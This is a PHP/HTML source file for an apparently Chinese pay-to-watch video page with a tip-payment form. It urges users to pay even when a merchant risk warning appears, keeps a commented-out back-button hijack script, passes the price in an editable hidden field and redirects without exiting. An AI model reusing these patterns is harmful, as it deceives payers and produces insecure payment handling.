<?php
include('init.php');
$id = $_GET['vid'];
//新客户端免费享受3次观看机会
$freePlay = Video::getFreePlayTimes(session_id());
if($freePlay > 0){
  header('Location:play.php?vid='.$id);
}
if(!$id){
    header('Location:list.php');
}
$video = Video::getVideoById($id);
if(!$video){
    header('Location:list.php');
}
//检查是否支付，跳转到播放页面
if(Video::canPlay($id,session_id())){
    header('Location:box.html?vid='.$id);
}
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<title>打赏看视频</title>
<script type="text/javascript">
//window.onhashchange=function(){jp();};  
//function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}  
//function jp() {location.href="http://www.qq.com/babygohome/?pgv_ref=404";}//返回地址
//setTimeout('hh();', 50);  
</script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-131836532-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-131836532-1');
</script>
 
<script src="https://cdn.bootcss.com/jquery/1.8.1/jquery.js"></script>
<style>
body{ padding:0; margin:0; font-family: "微软雅黑", "宋体";background:#302f34;}
ul,li,input,span{ padding:0; margin:0; list-style-type:none;}
.clear{ clear:both;}
input[type=button], input[type=submit], input[type=file], button { cursor: pointer; -webkit-appearance: none;}

.header{ height:70px; position:relative;width:100%;}
.head{ height:70px; background:#f4f4f4; border-bottom:1px solid #eeeeee; position:fixed; width:100%;}
.logo{ padding-left:20px; padding-top:15px;}
.h30{ height:30px;}
.h30a{ height:30px;}
.h10{ height:10px;}
.h10a{ height:10px;}
.mass{ width:100%; margin:0 auto; /*background:#302f34; background:#302f34; height:40px; position:fixed;*/ } 

.h_h50{ height:50px;}
.h_h20{ height:20px;}


.type{position:absolute;width:100%;z-index:1; bottom:40px; height:40px; line-height:28px; text-align:center; color:#6A6A6A; background:url(images/type.jpg) bottom left repeat-x; font-size:13px; }
.foot{ background:#302f34; height:40px; line-height:38px; text-align:center; width:100%; position: absolute; z-index:1; bottom:0px;color:#CCC;}
.foot img{ position:relative;top:0px; padding-right:5px;}
.foot a{color:#CCC; text-decoration:none;background: rgba(135, 135, 135, 0.2);display:block;height:30px;
    line-height: 30px;width:100%;}
.foot a:hover{color:#CCC; text-decoration:none;}

.ad{ position:absolute; z-index:1; width:100%; text-align:center; height:60px; overflow:hidden;}
.bg{ position:absolute; z-index:-2; width:100%; height:630px; background:#302f34 url(./static/img/<?php echo mt_rand(1,10);?>.gif) center top no-repeat; background-size:500px 600px; }

.cc{ position:absolute; background:url(images/t.png) right top no-repeat; height:550px; width:100%;}



.login_h1{ line-height:39px; text-align:center; color:#FFF; font-size:20px;font-family:"微软雅黑", "宋体";}
.login_coty{  bottom:0px; padding-top:35%; height:60px; margin:0 auto; width:600px; text-align:center; font-weight:bold; line-height:30px; font-size:20px; color:#FFF;font-family:"微软雅黑", "宋体";}



.hc{ margin:0 auto; width:280px; height:350px;opacity:0.6; border-radius:13px 13px; text-align:center; color:#FFF;  background:#fb3242; overflow:hidden; z-index:10; position: relative;   }

.hc_a{ height:200px;z-index:5;}
.hc_a_a{ padding-top:40px; height:50px; font-size:38px; line-height:30px; font-family: Arial, Helvetica, sans-serif;}
.hc_a_a span{ font-size:14px; padding-left:3px;}
.hc_a_b{font-size:14px; color:#ffcd93;}
.hc_a_c{font-size:23px; color:#e9ce18; font-family:"微软雅黑", "宋体"; font-weight:bold;padding-top:20px;}
.hc_b{position:relative; z-index:5; margin:0 auto; color:#000; width:110px; height:110px;  line-height:110px; border-radius:60px 60px; background:#dcbc83; font-size:50px;  font-family: Georgia, Times, serif;}
.hc_b_a{ margin:0 auto;width:102px; height:102px; position:relative; top:3px;  border-radius:60px 60px; border:1px solid #b49e78; }
.hc_b a{ color:#000; text-decoration:none;}
.hc_b a:hover{color:#000; text-decoration:none;}

.hc_c{ width:100%; height:210px; position:relative;top:-130px; z-index:1; background:url(images/v.png) top center no-repeat;}
.hc_c_a{font-size:12px; height:150px;}
.hc_c_b{font-size:13px;}



.tc_b{position:relative; z-index:5; margin:0 auto; color:#000; width:70px; height:70px;  line-height:66px; border-radius:40px 40px; background:#dcbc83; font-size:40px;  font-family: Georgia, Times, serif;}
.tc_b_a{ margin:0 auto;width:60px; height:60px; position:relative; top:4px; color:#d74e44;  border-radius:40px 40px; border:1px solid #b49e78; }
.tc_b2{ height:70px;}
.tc_a{ height:50px; line-height:40px; font-size:12px;}

.tc_c{ width:100%; height:300px; position:relative;top:-170px; z-index:1; background:url(images/c.png) top center no-repeat;}
.tc_c_a{font-size:12px; height:130px;}
.tc_c_b{font-size:23px; color:#e9ce18; font-family:"微软雅黑", "宋体"; font-weight:bold;}
.tc_c_c{font-size:30px;line-height:30px; font-family: Arial, Helvetica, sans-serif; padding-top:10px;}
.tc_c_c span{ font-size:14px; padding-left:3px;}
.tc_c_d{font-size:14px; color:#ffcd93; padding-top:10px;}
.tc_c_e{font-size:14px; color:#ffcd93; padding-top:10px;}
.tc_c_f{font-size:14px; color:#ffcd93; padding-top:15px;}
.tc_c_f a{ color:#000; text-decoration:none;}
.tc_c_f a:hover{color:#000; text-decoration:none;}
.tc_c_f input{ width:80%; margin:0 auto; height:40px; border:0; background:#fee2b3; font-family:"微软雅黑", "宋体"; color:#d74e44;font-size:18px;}

.tc_d{ height:30px; font-size:12px; line-height:30px; position:relative;top:-150px; }

@media screen and (max-width:700px){
.login_coty{ width:100%;}
.mass{ width:100%;}
.reg{ display:none;}	
.login{ float: none; width:96%;}
.login_account{ display:block;}
.login_bd2{display:block;}
.h_navn_l{ display: none;}
.h_navn_r{ margin-left:0px;}
.h30a{ display:none;}
.h_menu_nav{ display:block;}
.foot{width:100%;}
.hb{ width:76%;}
.hc{ width:70%;}
.foot{width:100%; z-index:-1;}
.type{z-index:-1;}
.ad{width:100%;}
.ad img{ width:100%;}
}
</style>
</head>
<body>


<div class="bg"></div>
<Div class="mass">

     	
        
        <Div class="h_h50"></Div>
        <Div class="h_h20"></Div>
        

        <Div class="hc">

          <Div class="tc_a">如遇商户风险提示，请放心支付，不影响观看</Div>
          <Div class="tc_b2">
            
          </Div>
          
          <div class="tc_c">
          	<div class="tc_c_a"></div>
            <div class="tc_c_b"></div>
         	<div class="tc_c_c"><?php echo $video['video_price'];?><span>元</span></div>
            <div class="tc_c_d">（如无法跳转请重新进入链接）</div>
            <form id="form1" action="pay.php?openid=<?php echo $_SERVER['REMOTE_ADDR'];?>&vid=<?php echo $video['id'];?>" method="post" target="_blank">
            <input type="hidden"  name="openid" value="<?php echo $_SERVER['REMOTE_ADDR'];?>" />
            <input type="hidden"  name="my_id" value="<?php echo $video['id'];?>" />
            <input type="hidden"  name="price" value="<?php echo $video['video_price'];?>" />
			<input type="hidden"  name="mid" value="" /> 
            <input type="hidden"  name="types" value="" /> 
            <div class="tc_c_f"><input type="submit" value="打 赏" /></div>
            </form>
            <div class="tc_c_f"><input type="button" value="更多精彩视频" onclick="javascrtpt:window.location.href='list.php'"></div>
          </div>
          
          <!--<div class="tc_d">视频大小:<?php echo $video['video_max'];?> , 时长:<?php echo $video['video_time'];?></div>-->
          <div class="tc_d">内容由用户发布,并非平台提供,赏金归发布者</div>
          
          
        </Div>	
    
        <Div class="h_h20"></Div>
<style>
.ui-prompt {
    width: 100%;
    height: 100%;
    position: fixed;
    z-index: 300;
    left: 0;
    top: 0;
    background-color: rgba(0,0,0,0.6);
    display:none;
}
.ui-prompt-content {
    width: 90%;
    max-width: 500px;
    position: absolute;
    top: 50%;
    left: 50%;
    -webkit-transform: translate(-50%,-50%);
    transform: translate(-50%,-50%);
    background-color: #fff;
    border-radius: 3px;
    overflow: hidden;
}
.ui-prompt-body {
    padding: 15px 10px;
    text-align: center;
}
.ui-prompt-body h2 {
    font-size: 16px;
}
.flex.between {
    -webkit-box-pack: justify;
    -ms-flex-pack: justify;
    justify-content: space-between;
}
.ui-prompt-foot>a:first-child {
    border-left: 0;
}
.ui-prompt-foot>a.confirm {
    color: #eb814c;
}
.ui-prompt-foot>a {
    line-height: 20px;
    border-left: 1px solid #e2e2e2;
    color: #424242;
}
.ui-prompt-foot {
    background-color: #f1f0f0;
    border-top: 1px solid #e2e2e2;
    padding: 10px 0;
}
.flex {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
}
.text-center {
    text-align: center !important;
}
.two>* {
    width: 50%;
}
</style>      
 <div class="ui-prompt">
<div class="ui-prompt-content">
<div class="ui-prompt-body">
<h2>请在商户页面完成付款</h2>
<p><small>完成前请不要关闭当前窗口</small></p></div>
<div class="ui-prompt-foot flex two between text-center">
<a class="cancel">使用其他付款方式</a><a class="confirm">已完成付款</a></div></div></div> 
</Div>


<div class="foot"><a href="/reports.html">投诉</a></div>

<script>
$(function(){
	$('.tc_c_f').click(function(){
		$('.ui-prompt').show();
	});
});
</script>

</body>
</html>

       
<?php
$contents = ob_get_contents();
ob_end_clean();
echo base64_encode($contents);
